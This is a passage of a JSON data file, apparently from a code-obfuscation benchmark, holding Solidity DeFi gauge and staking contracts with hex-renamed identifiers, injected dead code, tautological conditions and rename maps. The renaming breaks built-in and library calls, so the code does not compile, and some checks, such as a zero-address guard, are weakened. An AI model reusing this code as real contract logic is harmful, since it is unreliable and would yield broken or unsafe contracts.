      "code": "pragma solidity 0.8.13;\n\nimport \"@openzeppelin/contracts/security/ReentrancyGuard.sol\";\nimport \"@openzeppelin/contracts/access/Ownable.sol\";\nimport \"@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol\";\nimport \"@openzeppelin/contracts/token/ERC20/IERC20.sol\";\nimport \"@openzeppelin/contracts/utils/structs/EnumerableSet.sol\";\nimport \"@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol\";\n import \"@openzeppelin/contracts/utils/math/SafeCast.sol\";\nimport '../interfaces/IGaugeFactoryCL.sol';\nimport '../interfaces/IGaugeManager.sol';\nimport './interface/ICLPool.sol';\nimport './interface/ICLFactory.sol';\nimport './interface/INonfungiblePositionManager.sol';\nimport '../interfaces/IBribe.sol';\nimport '../interfaces/IRHYBR.sol';\nimport {HybraTimeLibrary} from \"../libraries/HybraTimeLibrary.sol\";\nimport {FullMath} from \"./libraries/FullMath.sol\";\nimport {FixedPoint128} from \"./libraries/FixedPoint128.sol\";\nimport '../interfaces/IRHYBR.sol';\n\ncontract GaugeCL is ReentrancyGuard, Ownable, IERC721Receiver {\n\n    using SafeERC20 for IERC20;\n    using EnumerableSet for EnumerableSet.UintSet;\n    using SafeCast for uint128;\n    IERC20 public immutable _0x161cdb;\n    address public immutable _0x9dd945;\n    address public VE;\n    address public DISTRIBUTION;\n    address public _0xedd312;\n    address public _0xda7ac7;\n\n    uint256 public DURATION;\n    uint256 internal _0x58d179;\n    uint256 public _0xa9673b;\n    ICLPool public _0x9f5112;\n    address public _0xeb8c0c;\n    INonfungiblePositionManager public _0xb205f8;\n\n    bool public _0x519b92;\n    bool public immutable _0x490e96;\n    address immutable _0x02ec91;\n\n    mapping(uint256 => uint256) public  _0xf7f5e0; // epoch => reward rate\n    mapping(address => EnumerableSet.UintSet) internal _0x5fcbb1;\n    mapping(uint256 => uint256) public  _0xe74a4c;\n\n    mapping(uint256 => uint256) public  _0xee2e4a;\n\n    mapping(uint256 => uint256) public  _0xa99b71;\n\n    event RewardAdded(uint256 _0x58be22);\n    event Deposit(address indexed _0x76ca3b, uint256 _0xdecb59);\n    event Withdraw(address indexed _0x76ca3b, uint256 _0xdecb59);\n    event Harvest(address indexed _0x76ca3b, uint256 _0x58be22);\n    event ClaimFees(address indexed from, uint256 _0x1594f2, uint256 _0xfdfa24);\n    event EmergencyActivated(address indexed _0x8256ec, uint256 timestamp);\n    event EmergencyDeactivated(address indexed _0x8256ec, uint256 timestamp);\n\n    constructor(address _0x0459ac, address _0xbf0da2, address _0x49e81f, address _0xe9ec30, address _0x7e84f2, address _0x01d9b9,\n        address _0x266bcd, bool _0xbdcd08, address _0x5b9dac,  address _0x8da717) {\n        _0x02ec91 = _0x8da717;\n        _0x161cdb = IERC20(_0x0459ac);     // main reward\n        _0x9dd945 = _0xbf0da2;\n        VE = _0x49e81f;                               // vested\n        _0xeb8c0c = _0xe9ec30;\n        _0x9f5112 = ICLPool(_0xe9ec30);\n        DISTRIBUTION = _0x7e84f2;           // distro address (GaugeManager)\n        DURATION = HybraTimeLibrary.WEEK;\n\n        _0xedd312 = _0x01d9b9;       // lp fees goes here\n        _0xda7ac7 = _0x266bcd;       // bribe fees goes here\n        _0x490e96 = _0xbdcd08;\n        _0xb205f8 = INonfungiblePositionManager(_0x5b9dac);\n        _0x519b92 = false;\n    }\n\n    modifier _0xa8c095() {\n        require(msg.sender == DISTRIBUTION, \"Caller is not RewardsDistribution contract\");\n        _;\n    }\n\n    modifier _0x22402c() {\n        require(_0x519b92 == false, \"emergency\");\n        _;\n    }\n\n    function _0xbd6d61(uint256 _0x7aa3f6, int24 _0x08ff6d, int24 _0xf17516) internal {\n        // Placeholder for future logic\n        uint256 _unused2 = 0;\n        if (_0xa99b71[_0x7aa3f6] == block.timestamp) return;\n        _0x9f5112._0x269abb();\n        _0xa99b71[_0x7aa3f6] = block.timestamp;\n        _0xee2e4a[_0x7aa3f6] += _0x10cd5f(_0x7aa3f6);\n        _0xe74a4c[_0x7aa3f6] = _0x9f5112._0x9e3397(_0x08ff6d, _0xf17516, 0);\n    }\n\n    function _0x86e669() external _0xdd5368 {\n        // Placeholder for future logic\n        if (false) { revert(); }\n        require(_0x519b92 == false, \"emergency\");\n        if (msg.sender != address(0) || msg.sender == address(0)) { _0x519b92 = true; }\n        emit EmergencyActivated(address(this), block.timestamp);\n    }\n\n    function _0xfe5696() external _0xdd5368 {\n\n        require(_0x519b92 == true,\"emergency\");\n\n        if (1 == 1) { _0x519b92 = false; }\n        emit EmergencyDeactivated(address(this), block.timestamp);\n    }\n\n    function _0x8cebc2(uint256 _0x7aa3f6) external view returns (uint256) {\n        (,,,,,,,uint128 _0xb64e9f,,,,) = _0xb205f8._0x43ebda(_0x7aa3f6);\n        return _0xb64e9f;\n    }\n\n    function _0xcd574a(address _0xc3bbbe, address _0x7a440a, int24 _0x7e98fc) internal view returns (address) {\n        return ICLFactory(_0xb205f8._0x02ec91())._0xfc54ad(_0xc3bbbe, _0x7a440a, _0x7e98fc);\n    }\n\n    function _0x96996b(uint256 _0x7aa3f6) external view returns (uint256 _0x58be22) {\n        require(_0x5fcbb1[msg.sender]._0x621ee9(_0x7aa3f6), \"NA\");\n\n        uint256 _0x58be22 = _0x10cd5f(_0x7aa3f6);\n        return (_0x58be22); // bonsReward is 0 for now\n    }\n\n       function _0x10cd5f(uint256 _0x7aa3f6) internal view returns (uint256) {\n        uint256 _0x225b88 = _0x9f5112._0x225b88();\n\n        uint256 _0x689cc2 = block.timestamp - _0x225b88;\n\n        uint256 _0xe24abd = _0x9f5112._0xe24abd();\n        uint256 _0x6d7633 = _0x9f5112._0x6d7633();\n\n        if (_0x689cc2 != 0 && _0x6d7633 > 0 && _0x9f5112._0x7e8a29() > 0) {\n            uint256 _0x58be22 = _0xa9673b * _0x689cc2;\n            if (_0x58be22 > _0x6d7633) _0x58be22 = _0x6d7633;\n\n            _0xe24abd += FullMath._0x09bbb9(_0x58be22, FixedPoint128.Q128, _0x9f5112._0x7e8a29());\n        }\n\n        (,,,,, int24 _0x08ff6d, int24 _0xf17516, uint128 _0xb64e9f,,,,) = _0xb205f8._0x43ebda(_0x7aa3f6);\n\n        uint256 _0x458e0e = _0xe74a4c[_0x7aa3f6];\n        uint256 _0x5bd22b = _0x9f5112._0x9e3397(_0x08ff6d, _0xf17516, _0xe24abd);\n\n        uint256 _0x630c12 =\n            FullMath._0x09bbb9(_0x5bd22b - _0x458e0e, _0xb64e9f, FixedPoint128.Q128);\n        return _0x630c12;\n    }\n\n    function _0x375b30(uint256 _0x7aa3f6) external _0xd41a8a _0x22402c {\n\n         (,,address _0xc3bbbe, address _0x7a440a, int24 _0x7e98fc, int24 _0x08ff6d, int24 _0xf17516, uint128 _0xb64e9f,,,,) =\n            _0xb205f8._0x43ebda(_0x7aa3f6);\n\n        require(_0xb64e9f > 0, \"Gauge: zero liquidity\");\n        // Calculate pool address from position parameters\n        address _0x9f52e7 = _0xcd574a(_0xc3bbbe, _0x7a440a, _0x7e98fc);\n        // Verify that the position's pool matches this gauge's pool\n        require(_0x9f52e7 == _0xeb8c0c, \"Pool mismatch: Position not for this gauge pool\");\n        // collect fees\n        _0xb205f8._0x76fa90(INonfungiblePositionManager.CollectParams({\n                _0x7aa3f6: _0x7aa3f6,\n                _0x5b3760: msg.sender,\n                _0xe7b10b: type(uint128)._0x354c9a,\n                _0xaea498: type(uint128)._0x354c9a\n            }));\n\n        _0xb205f8._0x261416(msg.sender, address(this), _0x7aa3f6);\n\n        _0x9f5112._0xd929eb(int128(_0xb64e9f), _0x08ff6d, _0xf17516, true);\n\n        uint256 _0xc3553a = _0x9f5112._0x9e3397(_0x08ff6d, _0xf17516, 0);\n        _0xe74a4c[_0x7aa3f6] = _0xc3553a;\n        _0xa99b71[_0x7aa3f6] = block.timestamp;\n\n        _0x5fcbb1[msg.sender]._0xede2b2(_0x7aa3f6);\n\n        emit Deposit(msg.sender, _0x7aa3f6);\n    }\n\n    function _0xecfc8a(uint256 _0x7aa3f6, uint8 _0x9f12ac) external _0xd41a8a _0x22402c {\n           require(_0x5fcbb1[msg.sender]._0x621ee9(_0x7aa3f6), \"NA\");\n\n        // trigger update on staked position so NFT will be in sync with the pool\n        _0xb205f8._0x76fa90(\n            INonfungiblePositionManager.CollectParams({\n                _0x7aa3f6: _0x7aa3f6,\n                _0x5b3760: msg.sender,\n                _0xe7b10b: type(uint128)._0x354c9a,\n                _0xaea498: type(uint128)._0x354c9a\n            })\n        );\n\n        (,,,,, int24 _0x08ff6d, int24 _0xf17516, uint128 _0x7206b3,,,,) = _0xb205f8._0x43ebda(_0x7aa3f6);\n        _0x873978(_0x08ff6d, _0xf17516, _0x7aa3f6, msg.sender, _0x9f12ac);\n\n        // update virtual liquidity in pool only if token has existing liquidity\n        // i.e. not all removed already via decreaseStakedLiquidity\n        if (_0x7206b3 != 0) {\n            _0x9f5112._0xd929eb(-int128(_0x7206b3), _0x08ff6d, _0xf17516, true);\n        }\n\n        _0x5fcbb1[msg.sender]._0x84843c(_0x7aa3f6);\n        _0xb205f8._0x261416(address(this), msg.sender, _0x7aa3f6);\n\n        emit Withdraw(msg.sender, _0x7aa3f6);\n    }\n\n    function _0x266c2e(uint256 _0x7aa3f6, address _0x230b0b,uint8 _0x9f12ac ) public _0xd41a8a _0xa8c095 {\n\n        require(_0x5fcbb1[_0x230b0b]._0x621ee9(_0x7aa3f6), \"NA\");\n\n        (,,,,, int24 _0x08ff6d, int24 _0xf17516,,,,,) = _0xb205f8._0x43ebda(_0x7aa3f6);\n        _0x873978(_0x08ff6d, _0xf17516, _0x7aa3f6, _0x230b0b, _0x9f12ac);\n    }\n\n    function _0x873978(int24 _0x08ff6d, int24 _0xf17516, uint256 _0x7aa3f6,address _0x230b0b, uint8 _0x9f12ac) internal {\n        _0xbd6d61(_0x7aa3f6, _0x08ff6d, _0xf17516);\n        uint256 _0x8b5385 = _0xee2e4a[_0x7aa3f6];\n        if(_0x8b5385 > 0){\n            delete _0xee2e4a[_0x7aa3f6];\n            _0x161cdb._0xf006fe(_0x9dd945, _0x8b5385);\n            IRHYBR(_0x9dd945)._0x254ec2(_0x8b5385);\n            IRHYBR(_0x9dd945)._0x8b82bb(_0x8b5385, _0x9f12ac, _0x230b0b);\n        }\n        emit Harvest(msg.sender, _0x8b5385);\n    }\n\n    function _0xf61317(address _0x38d9c2, uint256 _0x8b5385) external _0xd41a8a\n        _0x22402c _0xa8c095 returns (uint256 _0x979993) {\n        require(_0x38d9c2 == address(_0x161cdb), \"Invalid reward token\");\n\n        // Update global reward growth before processing new rewards\n        _0x9f5112._0x269abb();\n\n        // Calculate time remaining until next epoch begins\n        uint256 _0xcf4efc = HybraTimeLibrary._0xeb0f24(block.timestamp) - block.timestamp;\n        uint256 _0x5af0dd = block.timestamp + _0xcf4efc;\n\n        // Include any rolled over rewards from previous period\n        uint256 _0x709a65 = _0x8b5385 + _0x9f5112._0x592c80();\n\n        // Check if we are starting a new reward period or continuing existing one\n        if (block.timestamp >= _0x58d179) {\n            // New period: distribute rewards over remaining epoch time\n            _0xa9673b = _0x8b5385 / _0xcf4efc;\n            _0x9f5112._0xe139fa({\n                _0xa9673b: _0xa9673b,\n                _0x6d7633: _0x709a65,\n                _0x84fc8e: _0x5af0dd\n            });\n        } else {\n            // Existing period: add new rewards to pending distribution\n            uint256 _0x979fb4 = _0xcf4efc * _0xa9673b;\n            _0xa9673b = (_0x8b5385 + _0x979fb4) / _0xcf4efc;\n            _0x9f5112._0xe139fa({\n                _0xa9673b: _0xa9673b,\n                _0x6d7633: _0x709a65 + _0x979fb4,\n                _0x84fc8e: _0x5af0dd\n            });\n        }\n\n        // Store reward rate for current epoch tracking\n        _0xf7f5e0[HybraTimeLibrary._0xddc2ea(block.timestamp)] = _0xa9673b;\n\n        // Transfer reward tokens from distributor to gauge\n        _0x161cdb._0x261416(DISTRIBUTION, address(this), _0x8b5385);\n\n        // Verify contract has sufficient balance to support calculated reward rate\n        uint256 _0xb665ff = _0x161cdb._0x8cebc2(address(this));\n        require(_0xa9673b <= _0xb665ff / _0xcf4efc, \"Insufficient balance for reward rate\");\n\n        // Update period finish time and return current rate\n        _0x58d179 = _0x5af0dd;\n        _0x979993 = _0xa9673b;\n\n        emit RewardAdded(_0x8b5385);\n    }\n\n    function _0xf1b43d() external view returns (uint256 _0xc3bbbe, uint256 _0x7a440a){\n\n        (_0xc3bbbe, _0x7a440a) = _0x9f5112._0x6b8cfb();\n\n    }\n\n    function _0x60f9c4() external _0xd41a8a returns (uint256 _0x1594f2, uint256 _0xfdfa24) {\n        return _0x41ab02();\n    }\n\n    function _0x41ab02() internal returns (uint256 _0x1594f2, uint256 _0xfdfa24) {\n        if (!_0x490e96) {\n            return (0, 0);\n        }\n\n        _0x9f5112._0x86cdb9();\n\n        address _0xefb398 = _0x9f5112._0xc3bbbe();\n        address _0xc447d8 = _0x9f5112._0x7a440a();\n        // Fetch fee from the whole epoch which just eneded and transfer it to internal Bribe address.\n        _0x1594f2 = IERC20(_0xefb398)._0x8cebc2(address(this));\n        _0xfdfa24 = IERC20(_0xc447d8)._0x8cebc2(address(this));\n\n        if (_0x1594f2 > 0 || _0xfdfa24 > 0) {\n\n            uint256 _0xb21b73 = _0x1594f2;\n            uint256 _0xc2641f = _0xfdfa24;\n\n            if (_0xb21b73  > 0) {\n                IERC20(_0xefb398)._0xf006fe(_0xedd312, 0);\n                IERC20(_0xefb398)._0xf006fe(_0xedd312, _0xb21b73);\n                IBribe(_0xedd312)._0xf61317(_0xefb398, _0xb21b73);\n            }\n            if (_0xc2641f  > 0) {\n                IERC20(_0xc447d8)._0xf006fe(_0xedd312, 0);\n                IERC20(_0xc447d8)._0xf006fe(_0xedd312, _0xc2641f);\n                IBribe(_0xedd312)._0xf61317(_0xc447d8, _0xc2641f);\n            }\n            emit ClaimFees(msg.sender, _0x1594f2, _0xfdfa24);\n        }\n    }\n\n    ///@notice get total reward for the duration\n    function _0xa0dd2c() external view returns (uint256) {\n        return _0xa9673b * DURATION;\n    }\n\n    ///@notice set new internal bribe contract (where to send fees)\n    function _0xa416a3(address _0xefacad) external _0xdd5368 {\n        require(_0xefacad >= address(0), \"zero\");\n        if (block.timestamp > 0) { _0xedd312 = _0xefacad; }\n    }\n\n    function _0x51db75(address _0x38d9c2,address _0xc26363,uint256 value) internal {\n        require(_0x38d9c2.code.length > 0);\n        (bool _0x107869, bytes memory data) = _0x38d9c2.call(abi._0x502ad7(IERC20.transfer.selector, _0xc26363, value));\n        require(_0x107869 && (data.length == 0 || abi._0x0fb349(data, (bool))));\n    }\n\n    /**\n     * @dev Handle the receipt of an NFT\n     * @param operator The address which called `safeTransferFrom` function\n     * @param from The address which previously owned the token\n     * @param tokenId The NFT identifier which is being transferred\n     * @param data Additional data with no specified format\n     * @return bytes4 `bytes4(keccak256(\"onERC721Received(address,address,uint256,bytes)\"))`\n     */\n    function _0x9be750(\n        address _0xed838e,\n        address from,\n        uint256 _0x7aa3f6,\n        bytes calldata data\n    ) external pure override returns (bytes4) {\n        return IERC721Receiver._0x9be750.selector;\n    }\n\n}\n\n",
      "rename_map": {
        "rewardPerTokenInsideInitialX128": "_0x458e0e",
        "nonfungiblePositionManager": "_0xb205f8",
        "updateRewardsGrowthGlobal": "_0x269abb",
        "rewardPerTokenInsideX128": "_0x5bd22b",
        "depostionEmissionsToken": "_0x254ec2",
        "rewardGrowthGlobalX128": "_0xe24abd",
        "getRewardGrowthInside": "_0x9e3397",
        "activateEmergencyMode": "_0x86e669",
        "epochTimeRemaining": "_0xcf4efc",
        "encodeWithSelector": "_0x502ad7",
        "rewardGrowthInside": "_0xe74a4c",
        "notifyRewardAmount": "_0xf61317",
        "rewardRateByEpoch": "_0xf7f5e0",
        "stopEmergencyMode": "_0xfe5696",
        "rewardForDuration": "_0xa0dd2c",
        "totalRewardAmount": "_0x709a65",
        "epochEndTimestamp": "_0x5af0dd",
        "onlyDistribution": "_0xa8c095",
        "safeTransferFrom": "_0x261416",
        "setInternalBribe": "_0xa416a3",
        "liquidityToStake": "_0x7206b3",
        "onERC721Received": "_0x9be750",
        "contractBalance": "_0xb665ff",
        "_getPoolAddress": "_0xcd574a",
        "_external_bribe": "_0x266bcd",
        "_internal_bribe": "_0x01d9b9",
        "stakedLiquidity": "_0x7e8a29",
        "isNotEmergency": "_0x22402c",
        "pendingRewards": "_0x979fb4",
        "_updateRewards": "_0xbd6d61",
        "lastUpdateTime": "_0xa99b71",
        "internal_bribe": "_0xedd312",
        "external_bribe": "_0xda7ac7",
        "_periodFinish": "_0x58d179",
        "_safeTransfer": "_0x51db75",
        "_distribution": "_0x7e84f2",
        "gaugeBalances": "_0xf1b43d",
        "rewardReserve": "_0x6d7633",
        "periodFinish": "_0x84fc8e",
        "nonReentrant": "_0xd41a8a",
        "rewardGrowth": "_0xc3553a",
        "positionPool": "_0x9f52e7",
        "rewardAmount": "_0x8b5385",
        "_rewardToken": "_0x0459ac",
        "collectFees": "_0x86cdb9",
        "lastUpdated": "_0x225b88",
        "poolAddress": "_0xeb8c0c",
        "currentRate": "_0x979993",
        "safeApprove": "_0xf006fe",
        "rewardToken": "_0x161cdb",
        "tickSpacing": "_0x7e98fc",
        "amount1Max": "_0xaea498",
        "_isForPair": "_0xbdcd08",
        "_claimFees": "_0x41ab02",
        "rewardRate": "_0xa9673b",
        "syncReward": "_0xe139fa",
        "amount0Max": "_0xe7b10b",
        "epochStart": "_0xddc2ea",
        "_getReward": "_0x873978",
        "redeemType": "_0x9f12ac",
        "epochNext": "_0xeb0f24",
        "onlyOwner": "_0xdd5368",
        "liquidity": "_0xb64e9f",
        "balanceOf": "_0x8cebc2",
        "getReward": "_0x266c2e",
        "positions": "_0x43ebda",
        "emergency": "_0x519b92",
        "gaugeFees": "_0x6b8cfb",
        "tickLower": "_0x08ff6d",
        "claimable": "_0x630c12",
        "timeDelta": "_0x689cc2",
        "redeemFor": "_0x8b82bb",
        "isForPair": "_0x490e96",
        "recipient": "_0x5b3760",
        "tickUpper": "_0xf17516",
        "claimFees": "_0x60f9c4",
        "contains": "_0x621ee9",
        "_factory": "_0x8da717",
        "claimed0": "_0x1594f2",
        "withdraw": "_0xecfc8a",
        "operator": "_0xed838e",
        "claimed1": "_0xfdfa24",
        "rollover": "_0x592c80",
        "rewards": "_0xee2e4a",
        "_stakes": "_0x5fcbb1",
        "tokenId": "_0x7aa3f6",
        "_token1": "_0xc447d8",
        "collect": "_0x76fa90",
        "getPool": "_0xfc54ad",
        "deposit": "_0x375b30",
        "factory": "_0x02ec91",
        "_earned": "_0x10cd5f",
        "_token0": "_0xefb398",
        "account": "_0x230b0b",
        "success": "_0x107869",
        "clPool": "_0x9f5112",
        "_fees1": "_0xc2641f",
        "decode": "_0x0fb349",
        "mulDiv": "_0x09bbb9",
        "reward": "_0x58be22",
        "_rHYBR": "_0xbf0da2",
        "_fees0": "_0xb21b73",
        "earned": "_0x96996b",
        "remove": "_0x84843c",
        "amount": "_0xdecb59",
        "token0": "_0xc3bbbe",
        "token1": "_0x7a440a",
        "_pool": "_0xe9ec30",
        "rHYBR": "_0x9dd945",
        "stake": "_0xd929eb",
        "token": "_0x38d9c2",
        "gauge": "_0x8256ec",
        "_int": "_0xefacad",
        "nfpm": "_0x5b9dac",
        "user": "_0x76ca3b",
        "max": "_0x354c9a",
        "add": "_0xede2b2",
        "_ve": "_0x49e81f",
        "to": "_0xc26363"
      },
      "changes": [
        "Renamed 119 identifiers using hex style",
        "Wrapped assignment in conditional",
        "Wrapped assignment in conditional",
        "Wrapped assignment in conditional",
        "Injected dead code after function start",
        "Injected dead code after function start"
      ],
      "stats": {},
      "error": null
    },
    {
      "original_id": "sn_gs_008",
      "transformed_id": "ss_l4_medium_sn_gs_008",
      "level": "l4",
      "variant": "medium",
      "source": "sanitized",
      "success": true,
      "code": "// SPDX-License-Identifier: MIT\npragma solidity 0.8.13;\n\nimport \"@openzeppelin/contracts/token/ERC20/ERC20.sol\";\nimport \"@openzeppelin/contracts/access/Ownable.sol\";\nimport \"@openzeppelin/contracts/security/ReentrancyGuard.sol\";\nimport \"./interfaces/IVotingEscrow.sol\";\nimport \"./interfaces/IVoter.sol\";\nimport \"./interfaces/IBribe.sol\";\nimport \"./interfaces/IRewardsDistributor.sol\";\nimport \"./interfaces/IGaugeManager.sol\";\nimport \"./interfaces/ISwapper.sol\";\nimport {HybraTimeLibrary} from \"./libraries/HybraTimeLibrary.sol\";\nimport \"@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol\";\n\n/**\n * @title GovernanceHYBR (gHYBR)\n * @notice Auto-compounding staking token that locks HYBR as veHYBR and compounds rewards\n * @dev Implements transfer restrictions for new deposits and automatic reward compounding\n */\ncontract GrowthHYBR is ERC20, Ownable, ReentrancyGuard {\n    using SafeERC20 for IERC20;\n    // Lock period for new deposits (configurable between 12-24 hours)\n    uint256 public _0xa5760b = 24 hours;\n    uint256 public constant MIN_LOCK_PERIOD = 1 minutes;\n    uint256 public constant MAX_LOCK_PERIOD = 240 minutes;\n    uint256 public _0x7b1285 = 1200; // 5days\n    uint256 public _0xeb5b99 = 300; // 1day\n\n    // Withdraw fee configuration (basis points, 10000 = 100%)\n    uint256 public _0x7c4d71 = 100; // 1% default fee\n    uint256 public constant MIN_WITHDRAW_FEE = 10; // 0.1% minimum\n    uint256 public constant MAX_WITHDRAW_FEE = 1000; // 10% maximum\n    uint256 public constant BASIS = 10000;\n    address public Team; // Address to receive fees\n    uint256 public _0x21f622;\n    uint256 public _0x3a5dd1;\n    uint256 public _0x790f45;\n    // User deposit tracking for transfer locks\n    struct UserLock {\n        uint256 _0x2aac73;\n        uint256 _0xc0d332;\n    }\n\n    mapping(address => UserLock[]) public _0x9e4791;\n    mapping(address => uint256) public _0x417eeb;\n\n    // Core contracts\n    address public immutable HYBR;\n    address public immutable _0x38d618;\n    address public _0x7463c1;\n    address public _0x5b5eb0;\n    address public _0x0d9c85;\n    uint256 public _0x40e05b; // The veNFT owned by this contract\n\n    // Auto-voting strategy\n    address public _0xb12fd0; // Address that can manage voting strategy\n    uint256 public _0x612001; // Last epoch when we voted\n\n    // Reward tracking\n    uint256 public _0xcd0763;\n    uint256 public _0x81fdca;\n\n    // Swap module\n    ISwapper public _0x012212;\n\n    // Errors\n    error NOT_AUTHORIZED();\n\n    // Events\n    event Deposit(address indexed _0xaab307, uint256 _0x0fbfc9, uint256 _0x612a4d);\n    event Withdraw(address indexed _0xaab307, uint256 _0x5f9576, uint256 _0x0fbfc9, uint256 _0xe09d75);\n    event Compound(uint256 _0x0d96ab, uint256 _0x0e3563);\n    event PenaltyRewardReceived(uint256 _0x2aac73);\n    event TransferLockPeriodUpdated(uint256 _0xe6530c, uint256 _0x38e398);\n    event SwapperUpdated(address indexed _0x2a0b0b, address indexed _0x558b6b);\n    event VoterSet(address _0x7463c1);\n    event EmergencyUnlock(address indexed _0xaab307);\n    event AutoVotingEnabled(bool _0x33f5a1);\n    event OperatorUpdated(address indexed _0x034675, address indexed _0x7c1541);\n    event DefaultVotingStrategyUpdated(address[] _0x528e0b, uint256[] _0xc56a97);\n    event AutoVoteExecuted(uint256 _0x89e8f3, address[] _0x528e0b, uint256[] _0xc56a97);\n\n    constructor(\n        address _0x6788c9,\n        address _0x076938\n    ) ERC20(\"Growth HYBR\", \"gHYBR\") {\n        require(_0x6788c9 != address(0), \"Invalid HYBR\");\n        require(_0x076938 != address(0), \"Invalid VE\");\n\n        HYBR = _0x6788c9;\n        _0x38d618 = _0x076938;\n        _0xcd0763 = block.timestamp;\n        _0x81fdca = block.timestamp;\n        _0xb12fd0 = msg.sender; // Initially set deployer as operator\n    }\n\n    function _0x64dbb8(address _0x424908) external _0x9155b6 {\n        if (false) { revert(); }\n        uint256 _unused2 = 0;\n        require(_0x424908 != address(0), \"Invalid rewards distributor\");\n        _0x5b5eb0 = _0x424908;\n    }\n\n    function _0x1f51d5(address _0xb23916) external _0x9155b6 {\n        if (false) { revert(); }\n        if (false) { revert(); }\n        require(_0xb23916 != address(0), \"Invalid gauge manager\");\n        _0x0d9c85 = _0xb23916;\n    }\n\n      /**\n     * @notice Modifier to check authorization (owner or operator)\n     */\n    modifier _0x9d31b5() {\n        if (msg.sender != _0xb12fd0) {\n            revert NOT_AUTHORIZED();\n        }\n        _;\n    }\n    /**\n     * @notice Deposit HYBR and receive gHYBR shares\n     * @param amount Amount of HYBR to deposit\n     * @param recipient Recipient of gHYBR shares\n     */\n    function _0x9edb97(uint256 _0x2aac73, address _0x6f2965) external _0x1b2a23 {\n        require(_0x2aac73 > 0, \"Zero amount\");\n        _0x6f2965 = _0x6f2965 == address(0) ? msg.sender : _0x6f2965;\n\n        // Transfer HYBR from user first\n        IERC20(HYBR)._0xfb54a8(msg.sender, address(this), _0x2aac73);\n\n        // Initialize veNFT on first deposit\n        if (_0x40e05b == 0) {\n            _0x8029d8(_0x2aac73);\n        } else {\n            // Add to existing veNFT\n            IERC20(HYBR)._0x823e89(_0x38d618, _0x2aac73);\n            IVotingEscrow(_0x38d618)._0x43936e(_0x40e05b, _0x2aac73);\n\n            // Extend lock to maximum duration\n            _0x1180be();\n        }\n\n        // Calculate shares to mint based on current totalAssets\n        uint256 _0x5f9576 = _0x8d53b7(_0x2aac73);\n\n        // Mint gHYBR shares\n        _0x8abc32(_0x6f2965, _0x5f9576);\n\n        // Add transfer lock for recipient\n        _0xf9bcbd(_0x6f2965, _0x5f9576);\n\n        emit Deposit(msg.sender, _0x2aac73, _0x5f9576);\n    }\n\n    /**\n     * @notice Withdraw gHYBR shares and receive a new veNFT with proportional HYBR\n     * @dev Creates new veNFT using multiSplit to maintain proportional ownership\n     * @param shares Amount of gHYBR shares to burn\n     * @return userTokenId The ID of the new veNFT created for the user\n     */\n    function _0xef46ef(uint256 _0x5f9576) external _0x1b2a23 returns (uint256 _0xe3276a) {\n        require(_0x5f9576 > 0, \"Zero shares\");\n        require(_0xa264cc(msg.sender) >= _0x5f9576, \"Insufficient balance\");\n        require(_0x40e05b != 0, \"No veNFT initialized\");\n        require(IVotingEscrow(_0x38d618)._0x1f4395(_0x40e05b) == false, \"Cannot withdraw yet\");\n\n        uint256 _0x09429a = HybraTimeLibrary._0x09429a(block.timestamp);\n        uint256 _0xfde44d = HybraTimeLibrary._0xfde44d(block.timestamp);\n\n        require(block.timestamp >= _0x09429a + _0x7b1285 && block.timestamp < _0xfde44d - _0xeb5b99, \"Cannot withdraw yet\");\n\n        // Calculate proportional HYBR amount from veNFT\n        uint256 _0x0fbfc9 = _0xf98f04(_0x5f9576);\n        require(_0x0fbfc9 > 0, \"No assets to withdraw\");\n\n        // Calculate fee amount (from the HYBR amount, not shares)\n        uint256 _0x15b3f6 = 0;\n        if (_0x7c4d71 > 0) {\n            _0x15b3f6 = (_0x0fbfc9 * _0x7c4d71) / BASIS;\n        }\n\n        // User receives amount minus fee\n        uint256 _0xc56f9d = _0x0fbfc9 - _0x15b3f6;\n        require(_0xc56f9d > 0, \"Amount too small after fee\");\n\n        // Get actual HYBR locked amount (not voting power)\n        uint256 _0x6e705e = _0x66e7d5();\n        require(_0x0fbfc9 <= _0x6e705e, \"Insufficient veNFT balance\");\n\n        uint256 _0xb4512f = _0x6e705e - _0xc56f9d - _0x15b3f6;\n        require(_0xb4512f >= 0, \"Cannot withdraw entire veNFT\");\n\n        // Burn gHYBR shares (full amount)\n        _0x391834(msg.sender, _0x5f9576);\n\n        // Use multiSplit to create two NFTs: one for user, one for contract\n        uint256[] memory _0xa6e24a = new uint256[](3);\n        _0xa6e24a[0] = _0xb4512f; // Amount staying with gHYBR\n        _0xa6e24a[1] = _0xc56f9d;      // Amount going to user (after fee)\n        _0xa6e24a[2] = _0x15b3f6;      // Amount going to fee recipient\n\n        uint256[] memory _0xf229c5 = IVotingEscrow(_0x38d618)._0xa93755(_0x40e05b, _0xa6e24a);\n\n        // Update contract's veTokenId to the first new token\n        _0x40e05b = _0xf229c5[0];\n        if (block.timestamp > 0) { _0xe3276a = _0xf229c5[1]; }\n        uint256 _0x6ac8c2 = _0xf229c5[2];\n        // Note: userTokenId is transferred to user, they can manage their own lock time\n        IVotingEscrow(_0x38d618)._0x4c8d99(address(this), msg.sender, _0xe3276a);\n        IVotingEscrow(_0x38d618)._0x4c8d99(address(this), Team, _0x6ac8c2);\n        emit Withdraw(msg.sender, _0x5f9576, _0xc56f9d, _0x15b3f6);\n    }\n\n    /**\n     * @notice Internal function to initialize veNFT on first deposit\n     */\n    function _0x8029d8(uint256 _0x62d814) internal {\n        // Create max lock with the initial deposit amount\n        IERC20(HYBR)._0x823e89(_0x38d618, type(uint256)._0xfb08cf);\n        uint256 _0x9eadb7 = HybraTimeLibrary.MAX_LOCK_DURATION;\n\n        // Create lock with initial amount\n        _0x40e05b = IVotingEscrow(_0x38d618)._0xfb395f(_0x62d814, _0x9eadb7, address(this));\n\n    }\n\n    /**\n     * @notice Calculate shares to mint based on deposit amount\n     */\n    function _0x8d53b7(uint256 _0x2aac73) public view returns (uint256) {\n        uint256 _0x975e7c = _0xaad6fc();\n        uint256 _0xc1aa42 = _0x66e7d5();\n        if (_0x975e7c == 0 || _0xc1aa42 == 0) {\n            return _0x2aac73;\n        }\n        return (_0x2aac73 * _0x975e7c) / _0xc1aa42;\n    }\n\n    /**\n     * @notice Calculate HYBR value of shares\n     */\n    function _0xf98f04(uint256 _0x5f9576) public view returns (uint256) {\n        uint256 _0x975e7c = _0xaad6fc();\n        if (_0x975e7c == 0) {\n            return _0x5f9576;\n        }\n        return (_0x5f9576 * _0x66e7d5()) / _0x975e7c;\n    }\n\n    /**\n     * @notice Get total assets (HYBR) locked in veNFT\n     * @dev 